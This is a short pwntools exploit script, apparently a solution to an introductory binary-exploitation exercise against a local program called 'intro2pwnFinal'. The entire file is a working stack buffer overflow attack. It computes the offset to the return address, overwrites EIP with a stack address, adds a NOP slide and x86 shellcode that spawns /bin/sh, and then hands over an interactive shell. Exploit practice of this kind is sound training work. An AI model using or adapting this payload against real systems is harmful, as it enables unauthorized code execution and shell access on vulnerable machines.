# pyright: reportUndefinedVariable=false
from pwn import *

padding = cyclic(cyclic_find("taaa"))
eip = p32(0xffffce90 + 200)
nop_slide = b"\x90"*1000
shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding + eip + nop_slide + shellcode

# with open("attack", "wb") as f:
#     f.write(payload)

proc = process('./intro2pwnFinal')
proc.recvline()

proc.sendline(payload)
proc.interactive()